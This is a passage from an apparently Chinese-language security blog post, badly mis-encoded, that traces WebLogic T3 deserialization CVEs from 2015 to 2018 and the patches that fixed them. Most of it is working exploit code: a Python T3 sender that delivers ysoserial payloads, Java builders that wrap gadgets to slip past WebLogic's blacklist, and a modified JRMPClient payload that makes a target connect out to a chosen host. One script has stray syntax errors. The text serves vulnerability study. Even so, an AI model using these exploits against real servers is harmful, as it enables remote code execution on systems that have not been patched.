¹æ®å®é™…æƒ…å†µé‡æ–°</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3åè®®å¤´</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#é‡æ–°è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"CommonsCollections1"</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">"touch /tmp/CVE-2015-4852"</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><h2 id="CVE-2015-4852çš„ä¿®å¤"><a href="#CVE-2015-4852çš„ä¿®å¤" class="headerlink" title="CVE-2015-4852çš„ä¿®å¤"></a>CVE-2015-4852çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´1æœˆ p21984589_1036_Generic<br>ä¿®å¤æ–¹æ³•æ˜¯åœ¨resolveClassä¸­å¼•å…¥äº† ClassFilter.isBlackListedè¿›è¡Œè¿‡æ»¤ï¼Œè·Ÿè¿›weblogic.rmi.ClassFilterå¯ä»¥çœ‹åˆ°é»‘åå•å†…å®¹ã€‚<br><img src="1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png" alt="image.png"></p><p><img src="1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png" alt="image.png"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œå¦å¤–å‡ ä¸ªååºåˆ—åŒ–ç‚¹ä¹Ÿè¢«åŠ äº†ç›¸åŒçš„è¿‡æ»¤ï¼ˆä¸ä¸€ä¸€æ‰“å¼€çœ‹äº†ï¼‰ã€‚<br><img src="1584629682488-1765cfe9-738d-46a7-8dcf-5341c7ac5c6f.png" alt="image.png"></p><p><strong>ååºåˆ—åŒ–ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œä¸€ä¸ªæ˜¯è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ï¼ŒäºŒæ˜¯gadgetã€‚ç°åœ¨ååºåˆ—åŒ–è§¦å‘ç‚¹æœ‰äº†ï¼Œåé¢çš„t3çš„cveå°±æ˜¯ç»•é»‘åå•çš„å„ç§æŠ€å·§äº†ã€‚</strong></p><p>ä¸ºäº†è®©åé¢çš„åˆ†ææ›´å…·æœ‰è¯´æœåŠ›ï¼Œè¿™é‡Œä»¥10.3.6ä¸ºä¾‹è¯´æ˜å¦‚ä½•æ‰“è¡¥ä¸ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -it  -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bash</span><br><span class="line">docker cp /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Generic</span><br><span class="line">docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /p21984589_1036_Generic</span><br><span class="line">mv patch-catalog_23510.xml  patch-catalog.xml</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line">./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰“è¡¥ä¸æ—¶å‡ºç°å¦‚ä¸‹é”™è¯¯éœ€è¦è‡ªè¡ŒæŠŠbsu.shä¸­çš„å†…å­˜å‚æ•°MEM_ARGSè°ƒå¤§ä¸€ç‚¹ã€‚<br><img src="1584631227480-e3ca11bc-0c53-475e-9cd7-84828bef3c5f.png" alt="image.png"><br>æˆåŠŸåæˆªå›¾å¦‚ä¸‹<br><img src="1584631564760-944c5d18-1fa7-432a-b0bb-48b1a83e1379.png" alt="image.png"><br>è¿™æ—¶å†å°è¯•æ‰“ä¼šå‡ºç°Unauthorized<br><img src="1584632143015-10d8cd9f-88ab-41dc-807d-14af2ab6ef9b.png" alt="image.png"></p><h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>weblogic.jms.common.StreamMessageImplæ²¡åœ¨é»‘åå•ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶ä¼šè¯»å–ä¸€æ®µæ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™æ®µæ•°æ®ä¼ªé€ æˆrce payloadã€‚<br><img src="1584605337636-f9686a30-b0ee-4463-ac50-c0aa1727c272.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_0638</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_0638"</span>);</span><br><span class="line">        StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl(payload);</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2016_0638.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹±å…¥ä¸€ä¸ªQA<br>Qï¼šStreamMessageImplå¯ä»¥è¿‡é»‘åå•å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ä¸ºå•¥CommonsCollections1ä¾æ—§å¯ä»¥æˆåŠŸï¼ŒCommonsCollections1(org.apache.commons.collections.functors)ä¸æ˜¯åœ¨é»‘åå•é‡Œé¢å—ï¼Ÿ</p><p>Aï¼šç­”æ¡ˆæ˜¯ServerChannelInputStreamæ²¡æœ‰è¿‡æ»¤åˆ°org.apache.commons.collections.functorsï¼ˆåºŸè¯ï¼‰ã€‚ç»†èŠ‚æ˜¯è¿™æ ·çš„ï¼šServerChannelInputStreamçš„resolveClassæ£€éªŒåˆ°æ˜¯StreamMessageImplï¼Œä¸åœ¨é»‘åå•é‡Œé¢ï¼Œé€šè¿‡ã€‚ç„¶ååœ¨ååºåˆ—åŒ–æµç¨‹ä¸­ä¼šè°ƒç”¨StreamMessageImplçš„readExternalï¼ŒreadExternalå†…éƒ¨åˆnewäº†æ–°çš„ObjectInputStreamï¼ˆä»¥åç®€ç§°oisï¼‰å¹¶ä»ç¼“å†²åŒºè¯»ååºåˆ—åŒ–æ•°æ®å†æ¬¡è°ƒç”¨readObjectï¼Œè¿™é‡ŒåŸç”Ÿçš„oiså°±æ˜¯åŸç”Ÿçš„resolveClassæ–¹æ³•æ²¡æœ‰è¿‡æ»¤ã€‚</p><h2 id="CVE-2016-0638çš„ä¿®å¤"><a href="#CVE-2016-0638çš„ä¿®å¤" class="headerlink" title="CVE-2016-0638çš„ä¿®å¤"></a>CVE-2016-0638çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´4æœˆp22505423_1036_Generic<br>æŠŠåŸç”Ÿçš„oisæ¢æˆäº†FilteringObjectInputStream<br><img src="1584696710445-285d9310-d737-4813-9851-acb1ec0cb88c.png" alt="image.png"></p><p><img src="1585128049921-46a472c4-7c3e-4e27-b89b-8158dc26c689.png" alt="image.png"></p><h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>weblogic.corba.utils.MarshalledObjectä¸åœ¨é»‘åå•ä¸­ï¼Œå¹¶ä¸”åœ¨readResolveçš„æ—¶å€™ä¼šè¯»å–objBytesçš„å€¼èµ‹ç»™æ–°newçš„oisã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨objBytesä¸­æ”¾å…¥rce payloadå³å¯ã€‚<br><img src="1584673888248-d2782a8f-2687-4522-979d-648f5e9ebf9a.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_3510</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_3510"</span>);</span><br><span class="line">        MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(<span class="string">"foo"</span>);</span><br><span class="line">        Class cls = marshalledObject.getClass();</span><br><span class="line">        Field field = cls.getDeclaredField(<span class="string">"objBytes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(marshalledObject, payload);</span><br><span class="line">        ser(marshalledObject,<span class="string">"./CVE_2016_3510.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2016-3510çš„ä¿®å¤"><a href="#CVE-2016-3510çš„ä¿®å¤" class="headerlink" title="CVE-2016-3510çš„ä¿®å¤"></a>CVE-2016-3510çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´10æœˆ p23743997_1036_Generic<br>é‡å†™äº†resolveClassæ–¹æ³•ï¼ŒåŠ äº†è¿‡æ»¤ã€‚<br><img src="1584690943146-86f42e61-9803-4867-901f-18ceed907805.png" alt="image.png"></p><p><img src="1585129024461-13bed8a0-4c46-4d97-a8f4-6b89d07c44bb.png" alt="image.png"></p><h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>åˆ©ç”¨JRMPClientè¿›è¡Œå¸¦å¤–rceï¼Œè¿™ä¸ªæŠ€å·§ç›¸ä¿¡çœ‹è¿‡<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">æ©˜å­å¸ˆå‚…shiro rce</a>çš„æ“ä½œçš„å¸ˆå¾ˆç†Ÿæ‚‰äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#æ•°æ®åŒ…é•¿åº¦ï¼Œå…ˆå ä½ï¼Œåé¢ä¼šæ ¹æ®å®é™…æƒ…å†µé‡æ–°</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3åè®®å¤´</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#é‡æ–°è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"JRMPClient"</span>  <span class="comment">#CommonsCollections1 Jdk7u21 JRMPClient</span></span><br><span class="line">    command = <span class="string">"192.168.1.3:8080"</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-3248çš„ä¿®å¤"><a href="#CVE-2017-3248çš„ä¿®å¤" class="headerlink" title="CVE-2017-3248çš„ä¿®å¤"></a>CVE-2017-3248çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼šp24667634_1036_Generic<br>å®˜æ–¹çš„ä¿®å¤æ˜¯æ–°åŠ resolveProxyClassï¼Œè¿‡æ»¤java.rmi.registry.Registry<br><img src="1584934771356-0b9b6e3c-7b83-48d7-8d1d-da75cbcf714f.png" alt="image.png"></p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>ä¸Šé¢æåˆ°è¿‡æ»¤äº†Registryï¼Œè¿™æ ·ysoserialä¸­åŸç”ŸJRMPClientå°±æ‰“ä¸äº†ï¼Œä½†æ˜¯ä»ç„¶æœ‰å¤šç§åŠæ³•bypassã€‚</p><h3 id="æ›¿æ¢æ¥å£"><a href="#æ›¿æ¢æ¥å£" class="headerlink" title="æ›¿æ¢æ¥å£"></a>æ›¿æ¢æ¥å£</h3><p>å¼•ç”¨@<a href="https://xz.aliyun.com/u/4522"><strong>lpwd</strong></a>å¸ˆå‚…çš„è¯ï¼š</p><blockquote><p>è¿™ä¸ªCVEå»–ä¹Ÿæäº¤äº†ç»•è¿‡ï¼Œä»–çš„ç»•è¿‡æ˜¯ç”¨java.rmi.activation.Activatoræ›¿æ¢java.rmi.registry.Registryï¼Œä»è€Œç»•è¿‡resolveProxyClassçš„åˆ¤æ–­ã€‚å…¶å®è¿™é‡Œå¯¹æ¥å£æ²¡æœ‰è¦æ±‚ï¼Œä¸ä¸€å®šæ˜¯rmiæ¥å£ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªæ¥å£éƒ½è¡Œï¼Œæ¯”å¦‚java.util.Map</p></blockquote><p><img src="1584684491514-7974dab3-f688-4bf2-8e8d-e5d49f9a6bd5.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Map</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">            new Class[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç›´æ¥ç”¨UnicastRef"><a href="#ç›´æ¥ç”¨UnicastRef" class="headerlink" title="ç›´æ¥ç”¨UnicastRef"></a>ç›´æ¥ç”¨UnicastRef</h3><p>CVE-2017-3248çš„æ„é€ ä¸­æŠŠUnicastRefæ”¾å…¥äº†Registryï¼Œå…¶å®ç”¨UnicastRefä¹Ÿèƒ½åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å‘èµ·jrmpè¯·æ±‚ã€‚è¿™ç§æ–¹æ³•è¦æ¯”æ›¿æ¢æ¥å£çš„å¹²è„†å¾ˆå¤šã€‚åœ¨ysoserialä¸­åŠ ä¸€ä¸ªJRMPClient2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 